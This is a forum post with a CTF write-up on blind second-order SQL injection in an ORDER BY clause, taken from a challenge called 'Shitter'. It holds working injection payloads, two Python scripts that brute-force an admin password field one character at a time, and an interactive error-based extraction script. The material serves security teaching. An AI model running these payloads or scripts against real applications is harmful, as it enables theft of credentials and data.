<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Taking SQL Injections further (Blind Second Order SQL Injection + TMHC CTF Shitter Writeup) - Web Hacking - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="Recently we had our first edition of the TMHC CTF Competition, and one of the challenges was called Shitter (a play on twitter). The challenge was based on a special case of SQL injection, and I thought it would be a goo&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="18122.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Taking SQL Injections further (Blind Second Order SQL Injection + TMHC CTF Shitter Writeup)&#39;" href="18122.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:image" content="https://0x00sec.org/uploads/default/original/2X/e/ecf2d67eab1f6fefcd075b177f3ffa943c8fd99c.png" />
<meta property="og:image" content="https://0x00sec.org/uploads/default/original/2X/e/ecf2d67eab1f6fefcd075b177f3ffa943c8fd99c.png" />
<meta property="og:url" content="https://0x00sec.org/t/taking-sql-injections-further-blind-second-order-sql-injection-tmhc-ctf-shitter-writeup/18122" />
<meta name="twitter:url" content="https://0x00sec.org/t/taking-sql-injections-further-blind-second-order-sql-injection-tmhc-ctf-shitter-writeup/18122" />
<meta property="og:title" content="Taking SQL Injections further (Blind Second Order SQL Injection + TMHC CTF Shitter Writeup)" />
<meta name="twitter:title" content="Taking SQL Injections further (Blind Second Order SQL Injection + TMHC CTF Shitter Writeup)" />
<meta property="og:description" content="Recently we had our first edition of the TMHC CTF Competition, and one of the challenges was called Shitter (a play on twitter). The challenge was based on a special case of SQL injection, and I thought it would be a good development topic for a post on the 0x00sec forums. I have included the intended method of exploitation, and some others that I found interesting, that may be useful in situations of bug bounties or pentests.  Introduction  Let me start by saying that this article assumes that ..." />
<meta name="twitter:description" content="Recently we had our first edition of the TMHC CTF Competition, and one of the challenges was called Shitter (a play on twitter). The challenge was based on a special case of SQL injection, and I thought it would be a good development topic for a post on the 0x00sec forums. I have included the intended method of exploitation, and some others that I found interesting, that may be useful in situations of bug bounties or pentests.  Introduction  Let me start by saying that this article assumes that ..." />
<meta property="og:article:section" content="Web Hacking" />
<meta property="og:article:section:color" content="0E76BD" />
<meta property="og:article:tag" content="database" />
<meta property="og:article:tag" content="webhacking" />
<meta property="og:article:tag" content="sqli" />
<meta property="og:article:tag" content="hacking" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="5 mins 🕑" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="15 ❤" />
<meta property="article:published_time" content="2019-12-17T13:57:22+00:00" />
<meta property="og:ignore_canonical" content="true" />
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="18122.html">Taking SQL Injections further (Blind Second Order SQL Injection + TMHC CTF Shitter Writeup)</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/web-hacking/59.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #0E76BD"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Web Hacking</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
<div class="topic-category">
<div class="discourse-tags list-tags">
<a href="../../tag/database.html" class="discourse-tag" rel="tag">database</a>,
<a href="../../tag/webhacking.html" class="discourse-tag" rel="tag">webhacking</a>,
<a href="../../tag/sqli.html" class="discourse-tag" rel="tag">sqli</a>,
<a href="../../tag/hacking.html" class="discourse-tag" rel="tag">hacking</a>
</div>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="Taking SQL Injections further (Blind Second Order SQL Injection + TMHC CTF Shitter Writeup)">
<meta itemprop="articleSection" content="Web Hacking">
<meta itemprop="keywords" content="database, webhacking, sqli, hacking">
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/chivato"><span itemprop="name">chivato</span></a>
</span>
<link itemprop="mainEntityOfPage" href="18122.html">
<link itemprop="image" href="../../uploads/default/original/2X/e/ecf2d67eab1f6fefcd075b177f3ffa943c8fd99c.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2019-12-17T13:57:22Z" class="post-time">
December 17, 2019, 1:57pm
</time>
<meta itemprop="dateModified" content="2020-07-06T19:22:39Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p>Recently we had our first edition of the TMHC CTF Competition, and one of the challenges was called Shitter (a play on twitter). The challenge was based on a special case of SQL injection, and I thought it would be a good development topic for a post on the 0x00sec forums. I have included the intended method of exploitation, and some others that I found interesting, that may be useful in situations of bug bounties or pentests.</p>
<p><strong>Introduction</strong><br>
Let me start by saying that this article assumes that you understand the fundamentals of SQL Injection, and you are comfortable with exploiting basic SQL Vulnerabilities.</p>
<p>If you have ever looked into the topic in depth enough, you will have realized that depending on where the injection point is in the query, the limitations may vary, and the difficulty of exploitation may increase.</p>
<p>In this post I will be talking about some of the independent research I have undergone over the past week, relating to Blind Second Order SQL Injections in ORDER BY clauses.</p>
<p>I am going to individually explain the parts of this vulnerability, and then demonstrate how I was able to develop a solution for each individual problem that Blind Second Order SQL Injections may present.</p>
<p><strong>Blind SQL Injection</strong>:<br>
<em>Explanation</em><br>
Blind SQL Injections are any SQL Injections where direct database output is not offered, so you are essentially trying to leak data “blindly”. An example of this could be a logging system, where they insert the logs into a table, and you never see the logs, or the commands output. A basic solution for this would be using the sleep() function that most, if not all DBMS’ have.</p>
<p><em>Explanation of solution</em><br>
The sleep function causes the DBMS to not respond for a set amount of time, meaning that you can convert your query into some sort of a boolean query so the output is true or false, and if it is true, then make the DBMS sleep, due to the DBMS sleeping, the server response time will be longer, and you will be able to tell what the boolean SQL queries output was.</p>
<p><em>Example boolean sleep SQL Query</em><br>
<code>IF ([CONDITION]) THEN sleep(3); ELSE sleep(0); END IF; END;</code></p>
<p>In the example above, it checks whether the condition is true or false, and then depending on the conditions output, it will either sleep for 3 seconds, or 0 seconds.</p>
<p>Although, in our situation, instead of using sleep, we will be making the post order either be alphabetically ordered title or alphabetically ordered contents, so we can create a post called “A” with “Z” as the contents, and another post called “Z” with “A” as the contents.</p>
<p><strong>Second Order SQL Injection</strong>:<br>
<em>Explanation</em><br>
For the people who may not have heard of Second Order SQL Injections, here is a perfect explanation pulled directly from <a href="https://portswigger.net/kb/issues/00100210_sql-injection-second-order" rel="noopener nofollow ugc">https://portswigger.net/kb/issues/00100210_sql-injection-second-order</a></p>
<blockquote>
<p>Second-order SQL injection arises when user-supplied data is stored by the application and later incorporated into SQL queries in an unsafe way. To detect the vulnerability, it is normally necessary to submit suitable data in one location, and then use some other application function that processes the data in an unsafe way.</p>
</blockquote>
<p>Due to second order SQL Injections not taking user input directly from the user, but instead storing it in another part of the database or backed (it could be stored in a cookie), it is generally harder to recognize and find in larger applications.</p>
<p><strong>Injection point being the ORDER BY clause</strong>:<br>
<em>Explanation</em><br>
SQL Query syntax is extremely specific, and not flexible enough for the usual SQL Injection payloads that make use of UNION to append data onto what the database already responds with.</p>
<p><em>Explanation of solution</em><br>
After some research, I came to the conclusion* that if the injection point is directly after the ORDER BY clause (for example: <code>SELECT * FROM users WHERE name = "test" ORDER BY USER-INPUT;</code>) then you can make use of the CASE clause that exists in certain DBMS’, for my research I used MySQL as the DBMS of choice.</p>
<p>The technique I have managed to come up with for this explicit situation looks something like this:<br>
<code>(SELECT (CASE WHEN EXISTS(SELECT [column] FROM [table] WHERE [column] REGEXP "^.*" AND [FURTHER CONDITIONS]) THEN [One column name] ELSE [Another column name] END));</code></p>
<p>Here are some examples of testing this query on MySQL directly:</p>
<pre><code class="lang-auto">MariaDB [shitter]&gt; SELECT post_title, post_content, post_creation_time FROM posts WHERE creator_id = 1 ORDER BY (SELECT (CASE WHEN EXISTS(SELECT password FROM users WHERE password REGEXP "^.*") THEN post_
creation_time ELSE post_content END));
+---------------+---------------------------------------------------+---------------------+
| post_title    | post_content                                      | post_creation_time  |
+---------------+---------------------------------------------------+---------------------+
| From: chivato | Welcome to shitter! Visit /create to get started! | 2019-11-29 15:10:02 |
| test          | tteetteet                                         | 2019-11-29 15:10:15 |
+---------------+---------------------------------------------------+---------------------+
2 rows in set (0.00 sec)

MariaDB [shitter]&gt; SELECT post_title, post_content, post_creation_time FROM posts WHERE creator_id = 1 ORDER BY (SELECT (CASE WHEN EXISTS(SELECT password FROM users WHERE password REGEXP "^x.*") THEN post
_creation_time ELSE post_content END));
+---------------+---------------------------------------------------+---------------------+
| post_title    | post_content                                      | post_creation_time  |
+---------------+---------------------------------------------------+---------------------+
| test          | tteetteet                                         | 2019-11-29 15:10:15 |
| From: chivato | Welcome to shitter! Visit /create to get started! | 2019-11-29 15:10:02 |
+---------------+---------------------------------------------------+---------------------+
2 rows in set (0.00 sec)
</code></pre>
<p>As demonstrated above, when the regex that the password is compared to returns true, the posts are ordered by the post title (F is before t in the alphabet, so <code>From: chivato</code> is displayed before the <code>test</code> post). The opposite can also be seen in the next query, where the regex now checks if the password field entry starts with “x” (this has to be false since I am using md5 to hash my passwords, and there will never be an x in an md5 hash due to the hex encoding), due to this query being false, the posts are now ordered by post contents (t is before W in the alphabet, so the posts that have content starting with <code>t</code> are displayed before the ones that have contents starting with <code>W</code>).</p>
<p><strong>Breakdown</strong>:<br>
Now let’s break this query down, and explain each separate part of it, to facilitate the visualization of the situation / back-end processing, I have developed a vulnerable social media app (the Shitter webapp used in the CTF), where a user can create a post and then change the order of these posts (this is the injection point) in settings, where the order selected is inserted into the user’s server signed cookie, the contents of the “order” value in the cookie are then placed directly into a SQL query (inside the ORDER BY clause), finall being executed when the posts are being taken from the database (when a profile is being loaded up).</p>
<p>So, the initial SELECT() inserts the internal queries output into the end of the query, inside that parentesis, we have an EXIST(SELECT…), this exist converts the query to a boolean query, since it makes it so that, if there is an output for the select query in the center of the nested query, then the exist will output 1, if not, it will return 0, 1 being true, 0 being false.</p>
<p>This is where the CASE part comes in, if the EXIST part of the statement responds with 1, then the case will order by the first column specified, if not, it will order by the second column specified, so you can go to the page used to trigger the second order SQLi, and depending on the output order of the posts, you will know if the EXISTS returned 0 or 1.</p>
<p>Finally, the inside of the EXISTS() function is a normal query, that uses a REGEXP to bruteforce one character at a time (if it is a hash, then you only need a-f and 0-9, due to hex encoding on the ‘mainstream’ hashes). In our case we want to leak a flag, so I have developed the following script that bruteforces the REGEXP character by character using a set dictionary of basic alhpanumeric chars (a-zA-Z0-9).</p>
<p>Essentially, instead of using the sleep function (which would be much slower and would not work due to the situation of the injection point), we make use of the fact that we have control over the ORDER BY clause, and use this as our true / false identifier instead of the response time of the server.</p>
<p><strong>Shitter solution</strong>:</p>
<p>Upon finding the injection point we see “post_creation_time asc”, which could only fit in the ORDER BY clause of a SQL Query, so we know where our injection is being inserted into, let’s see if it is vulnerable.</p>
<p>So we send the request to update the post order and add a <code>'</code> on the end:<br>
<img src="../../uploads/default/original/2X/e/ecf2d67eab1f6fefcd075b177f3ffa943c8fd99c.png" alt data-base62-sha1="xO8XzaRYSW2CCY6JFxw6S899yhK" width="690" height="315"></p>
<p>Now we try and trigger the SQL Query by loading a users posts:<br>
<div class="lightbox-wrapper"><a class="lightbox" href="../../uploads/default/original/2X/5/53b22b20bfbc993681eb33cb04e23085686d5f2d.png" data-download-href="/uploads/short-url/bWplXF2cdFb4Jvxj0i7bplQAzql.png?dl=1" title><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/5/53b22b20bfbc993681eb33cb04e23085686d5f2d_2_690x353.png" alt data-base62-sha1="bWplXF2cdFb4Jvxj0i7bplQAzql" width="690" height="353" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/5/53b22b20bfbc993681eb33cb04e23085686d5f2d_2_690x353.png, https://0x00sec.s3.amazonaws.com/optimized/2X/5/53b22b20bfbc993681eb33cb04e23085686d5f2d_2_1035x529.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/5/53b22b20bfbc993681eb33cb04e23085686d5f2d_2_1380x706.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/5/53b22b20bfbc993681eb33cb04e23085686d5f2d_2_10x10.png"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use xlink:href="#far-image"></use></svg><span class="filename"></span><span class="informations">1806×924 270 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use xlink:href="#discourse-expand"></use></svg></div></a></div></p>
<p>Perfect, we get a sql error due to the unterminated string (this is due to the standalone <code>'</code>).</p>
<p>Now we can get to the actual injection, we know we control anything after the ORDER BY clause, so we control the posts order, I wonder if there is a way of using IF statements in MySQL, initially I came across this: <a href="http://www.mysqltutorial.org/mysql-if-statement/" rel="noopener nofollow ugc">http://www.mysqltutorial.org/mysql-if-statement/</a>, although I was not able to get this to work, I believe this is due to the IF statement needing to either be at the start of the query, or in a set SQL procedure.</p>
<p>Then I remembered there being a similar “CASE” (<a href="https://www.w3schools.com/sql/func_mysql_case.asp" rel="noopener nofollow ugc">https://www.w3schools.com/sql/func_mysql_case.asp</a>) clause in MySQL that has a very similar functionality, if not identical to IF statements, which can be placed anywhere in a SQL query, so I tried it in my make-shift shitter database and boom! It works (after a while of fiddling with the statement).</p>
<pre><code class="lang-auto">MariaDB [shitter]&gt; SELECT post_title, post_content, post_creation_time FROM posts WHERE creator_id = 2 ORDER BY (SELECT (CASE WHEN (1=1) THEN post_creation_time ELSE post_content END));
+------------+--------------+---------------------+
| post_title | post_content | post_creation_time  |
+------------+--------------+---------------------+
| A          | Z            | 2019-12-17 13:21:20 |
| Z          | A            | 2019-12-17 13:21:25 |
+------------+--------------+---------------------+
2 rows in set (0.02 sec)

MariaDB [shitter]&gt; SELECT post_title, post_content, post_creation_time FROM posts WHERE creator_id = 2 ORDER BY (SELECT (CASE WHEN (1=2) THEN post_creation_time ELSE post_content END));
+------------+--------------+---------------------+
| post_title | post_content | post_creation_time  |
+------------+--------------+---------------------+
| Z          | A            | 2019-12-17 13:21:25 |
| A          | Z            | 2019-12-17 13:21:20 |
+------------+--------------+---------------------+
2 rows in set (0.01 sec)

MariaDB [shitter]&gt;
</code></pre>
<p>So we now have a working injection, let’s try it on shitter, first we make the condition true:<br>
<div class="lightbox-wrapper"><a class="lightbox" href="../../uploads/default/original/2X/f/f85255f618610a8d4aaf684e647ca97897ea7217.png" data-download-href="/uploads/short-url/zqKOBMoQBxSDZpjH0TVDAmxueZV.png?dl=1" title><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f85255f618610a8d4aaf684e647ca97897ea7217_2_690x279.png" alt data-base62-sha1="zqKOBMoQBxSDZpjH0TVDAmxueZV" width="690" height="279" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f85255f618610a8d4aaf684e647ca97897ea7217_2_690x279.png, ../../uploads/default/original/2X/f/f85255f618610a8d4aaf684e647ca97897ea7217.png 1.5x, ../../uploads/default/original/2X/f/f85255f618610a8d4aaf684e647ca97897ea7217.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/f/f85255f618610a8d4aaf684e647ca97897ea7217_2_10x10.png"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use xlink:href="#far-image"></use></svg><span class="filename"></span><span class="informations">912×370 33.6 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use xlink:href="#discourse-expand"></use></svg></div></a></div><br>
And we trigger the SQL Injection:<br>
<div class="lightbox-wrapper"><a class="lightbox" href="../../uploads/default/original/2X/1/195964c4ce0cf659cb328e691c40aad1f98b27b3.png" data-download-href="/uploads/short-url/3CfsCSdmhre230NkkOa6m0lkFbR.png?dl=1" title><img src="../../uploads/default/original/2X/1/195964c4ce0cf659cb328e691c40aad1f98b27b3.png" alt data-base62-sha1="3CfsCSdmhre230NkkOa6m0lkFbR" width="690" height="401" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/1/195964c4ce0cf659cb328e691c40aad1f98b27b3_2_10x10.png"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use xlink:href="#far-image"></use></svg><span class="filename"></span><span class="informations">1566×912 4.7 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use xlink:href="#discourse-expand"></use></svg></div></a></div><br>
Cool, so the posts were ordered by the post_title, and not the contents.</p>
<p>Now let’s demonstrate the other way around:<br>
<div class="lightbox-wrapper"><a class="lightbox" href="../../uploads/default/original/2X/7/74e152bb8379f8229c7b43e29c8d8533136bf9f9.png" data-download-href="/uploads/short-url/gFY8Dg4sgaYBxAovTfpk5WyFCPL.png?dl=1" title><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/7/74e152bb8379f8229c7b43e29c8d8533136bf9f9_2_690x178.png" alt data-base62-sha1="gFY8Dg4sgaYBxAovTfpk5WyFCPL" width="690" height="178" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/7/74e152bb8379f8229c7b43e29c8d8533136bf9f9_2_690x178.png, ../../uploads/default/original/2X/7/74e152bb8379f8229c7b43e29c8d8533136bf9f9.png 1.5x, ../../uploads/default/original/2X/7/74e152bb8379f8229c7b43e29c8d8533136bf9f9.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/7/74e152bb8379f8229c7b43e29c8d8533136bf9f9_2_10x10.png"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use xlink:href="#far-image"></use></svg><span class="filename"></span><span class="informations">1032×267 22.5 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use xlink:href="#discourse-expand"></use></svg></div></a></div><br>
<div class="lightbox-wrapper"><a class="lightbox" href="../../uploads/default/original/2X/3/37128434fc6d6d39f00741947c922f2c9b57f2a6.png" data-download-href="/uploads/short-url/7RbVNbzdWX7LWqUNlcPb2qxkjBQ.png?dl=1" title><img src="../../uploads/default/original/2X/3/37128434fc6d6d39f00741947c922f2c9b57f2a6.png" alt data-base62-sha1="7RbVNbzdWX7LWqUNlcPb2qxkjBQ" width="690" height="379" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/3/37128434fc6d6d39f00741947c922f2c9b57f2a6_2_10x10.png"><div class="meta"><svg class="fa d-icon d-icon-far-image svg-icon" aria-hidden="true"><use xlink:href="#far-image"></use></svg><span class="filename"></span><span class="informations">1659×912 5.02 KB</span><svg class="fa d-icon d-icon-discourse-expand svg-icon" aria-hidden="true"><use xlink:href="#discourse-expand"></use></svg></div></a></div></p>
<p>We have confirmed that depending on whether the output of the statement is 0 or 1, the post will either be ordered by title, or contents. We can combine this idea with EXISTS() (<a href="https://dev.mysql.com/doc/refman/8.0/en/exists-and-not-exists-subqueries.html" rel="noopener nofollow ugc">https://dev.mysql.com/doc/refman/8.0/en/exists-and-not-exists-subqueries.html</a>) and REGEXP (<a href="https://www.w3resource.com/mysql/string-functions/mysql-regexp-function.php" rel="noopener nofollow ugc">https://www.w3resource.com/mysql/string-functions/mysql-regexp-function.php</a>) to slowly leak the contents of the admin password field.</p>
<p>I developed a short script to automate this:</p>
<pre><code class="lang-python">import requests, time

s = requests.Session()
dictionary = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','0','_','{','}']
URL = "http://gusralph.info:5000"
username = "demo"
password = "demo"
data = {'name' : username, 'password' : password}
r = s.post(url = URL + "/login", data = data)
final = ""

while True:
        data = {'order' : 'post_creation_time ASC'}
        r = s.post(url = URL + "/settings", data = data)
        for x in dictionary:
                data = {'order' : '(SELECT (CASE WHEN EXISTS(SELECT password FROM users WHERE password REGEXP "^' + str(final) + x + '.*" AND name = "admin") THEN post_content ELSE post_creation_time END)); -- -'}
                r = s.post(url = URL + "/settings", data = data)
                out = s.get(url = URL + "/profile/2")
                if out.text.find('aaaaaaasdsd') &lt; out.text.find('ZZZZ'):
                        final += x
                        print "Leaking contents of admin hash: " + final
                        break
                else:
                        pass
</code></pre>
<p>This script manages to leak the contents of the admin password field:</p>
<pre><code class="lang-auto">chiv@Dungeon:~$ python solver.py
Leaking contents of admin hash: t
Leaking contents of admin hash: tm
Leaking contents of admin hash: tmh
Leaking contents of admin hash: tmhc
Leaking contents of admin hash: tmhc{
Leaking contents of admin hash: tmhc{b
Leaking contents of admin hash: tmhc{bl
Leaking contents of admin hash: tmhc{bl1
[...]
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinje
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjec
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinject
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjecti
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjecti0
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjecti0n
Leaking contents of admin hash: tmhc{bl1ndsqls3c0ndorderinjecti0n}
</code></pre>
<p>Although, the MySQL REGEXP function is not case sensitive (<a href="https://www.w3resource.com/mysql/string-functions/mysql-regexp-function.php" rel="noopener nofollow ugc">https://www.w3resource.com/mysql/string-functions/mysql-regexp-function.php</a>), so I added the <code>BINARY</code> function after the REGEXP to create the final script:</p>
<pre><code class="lang-python">import requests, time

s = requests.Session()
dictionary = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','0','1','2','3','4','5','6','7','8','9','0','_','{','}']
URL = "http://gusralph.info:5000"
username = "demo"
password = "demo"
data = {'name' : username, 'password' : password}
r = s.post(url = URL + "/login", data = data)
final = ""

while True:
        data = {'order' : 'post_creation_time ASC'}
        r = s.post(url = URL + "/settings", data = data)
        for x in dictionary:
                data = {'order' : '(SELECT (CASE WHEN EXISTS(SELECT password FROM users WHERE password REGEXP BINARY "^' + str(final) + x + '.*" AND name = "admin") THEN post_content ELSE post_creation_time END)); -- -'}
                r = s.post(url = URL + "/settings", data = data)
                out = s.get(url = URL + "/profile/2")
                if out.text.find('aaaaaaasdsd') &lt; out.text.find('ZZZZ'):
                        final += x
                        print "Leaking contents of admin hash: " + final
                        break
                else:
                        pass
</code></pre>
<p>With the final result being:</p>
<pre><code class="lang-auto">chiv@Dungeon:~$ python solver.py
Leaking contents of admin hash: T
Leaking contents of admin hash: TM
Leaking contents of admin hash: TMH
Leaking contents of admin hash: TMHC
Leaking contents of admin hash: TMHC{
Leaking contents of admin hash: TMHC{B
[..]
Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJect
Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJecti
Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJecti0
Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJecti0n
Leaking contents of admin hash: TMHC{Bl1nDSQlS3c0ndorderINJecti0n}
</code></pre>
<p><strong>Unintended methods of solving Shitter</strong>:<br>
<em>Alternative (kudos to Morph3 (<a href="https://twitter.com/melihkaanyldz" rel="noopener nofollow ugc">https://twitter.com/melihkaanyldz</a>))</em>:<br>
In the CTF I forgot to add a try: except: into the script to handle the python errors, which can sometimes be overly verbose. If I had added the try and except it would have just redirected to a /error page. Due to the overly verbose error messages, and the flask debug being set to True in my script, there was a certain payload that could be used, that caused the flask error message to actually display the queries output.</p>
<p>An example of what the output would look like is:</p>
<pre><code class="lang-auto">  File "/home/chivato/.local/lib/python2.7/site-packages/pymysql/protocol.py", line 220, in check_error
    err.raise_mysql_exception(self._data)
  File "/home/chivato/.local/lib/python2.7/site-packages/pymysql/err.py", line 109, in raise_mysql_exception
    raise errorclass(errno, errval)
InternalError: (1105, u"XPATH syntax error: '\nTMHC{Bl1nDSQlS3c0ndorderINJecti'")

--&gt;
</code></pre>
<p>The query that breaks the challenge being:<br>
<code>1,extractvalue(0x0a,concat(0x0a,([SQL QUERY HERE])))#</code></p>
<p>Here is a script he developed to automate the process:</p>
<pre><code class="lang-python">import requests

s = requests.Session()

url = "URL:PORT/"
data = {
    "name":"USERNAME",
    "password":"PASSWORD"
}

r = s.post(url+"login",data=data)

q = "select database()"

while q != "q":
    data = {
         "order" : "1,extractvalue(0x0a,concat(0x0a,({})))#".format(q)
    }
    r = s.post(url+"settings",data=data)
    r = s.get(url+"profile/1")
    print r.text
    q = raw_input("~#:")
</code></pre>
